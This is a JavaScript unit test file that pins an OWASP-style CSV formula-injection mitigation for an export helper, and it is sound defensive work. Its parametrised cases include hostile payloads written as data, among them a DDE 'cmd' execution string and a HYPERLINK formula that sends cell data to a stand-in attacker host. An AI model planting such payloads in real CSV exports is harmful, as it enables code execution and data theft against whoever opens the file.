// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Aaron K. Clark
//
// Unit tests for the CSV escape helper shared by the export
// controllers. Pins the OWASP-recommended formula-injection
// mitigation so a future "cleanup" can't silently rip it out.

import { describe, test, expect } from 'vitest';
import { escapeCsvCell } from '../../app/controllers/_csv-escape.js';

describe('escapeCsvCell — baseline quoting', () => {
    test('null and undefined collapse to empty quoted cell', () => {
        expect(escapeCsvCell(null)).toBe('""');
        expect(escapeCsvCell(undefined)).toBe('""');
    });

    test('plain strings round-trip unchanged inside quotes', () => {
        expect(escapeCsvCell('hello')).toBe('"hello"');
        expect(escapeCsvCell('plain text 123')).toBe('"plain text 123"');
    });

    test('embedded double-quote is doubled per RFC 4180', () => {
        expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""');
    });

    test('numbers and booleans serialize via String()', () => {
        expect(escapeCsvCell(42)).toBe('"42"');
        expect(escapeCsvCell(true)).toBe('"true"');
        expect(escapeCsvCell(0)).toBe('"0"');
    });

    test('Date instances render as ISO 8601', () => {
        const d = new Date('2026-05-19T12:34:56Z');
        expect(escapeCsvCell(d)).toBe('"2026-05-19T12:34:56.000Z"');
    });
});

describe('escapeCsvCell — formula-injection mitigation (OWASP)', () => {
    // Excel / LibreOffice / Google Sheets all evaluate a cell as
    // a formula when it begins with one of these characters. The
    // export tables contain free-text fields supplied by any
    // authenticated tenant, so a malicious entry could plant a
    // payload that fires when a co-tenant operator opens the CSV.
    test.each([
        '=cmd|\'/c calc\'!A1',
        '=HYPERLINK("http://attacker/?d="&A1, "click")',
        '=2+2',
        '+1+1',
        '-1+1',
        '@SUM(A:A)',
        '\t=2+2',  // leading tab also evaluated by Excel
        '\r=2+2',  // leading CR likewise
    ])('cell starting with formula trigger %j gets a leading single quote', (payload) => {
        const out = escapeCsvCell(payload);
        // The leading char inside the quoted cell must be a single quote,
        // pushing the dangerous char one position to the right so the
        // spreadsheet engine treats the cell as a literal string.
        expect(out.startsWith('"\'')).toBe(true);
        // The original payload is still present (quote-doubled if
        // applicable), just one position over.
        expect(out).toContain("'" + payload.replace(/"/g, '""'));
    });

    test('benign strings that merely CONTAIN trigger chars are not prefixed', () => {
        // The mitigation matches the FIRST character only — a comment
        // like "billed @ $100" is fine and should not get the quote.
        expect(escapeCsvCell('billed @ $100')).toBe('"billed @ $100"');
        expect(escapeCsvCell('a+b')).toBe('"a+b"');
        expect(escapeCsvCell('refund -50')).toBe('"refund -50"');
        expect(escapeCsvCell('x = y')).toBe('"x = y"');
    });

    test('empty string is not double-prefixed', () => {
        // The `s.length > 0` guard avoids prefixing an empty value.
        expect(escapeCsvCell('')).toBe('""');
    });
});
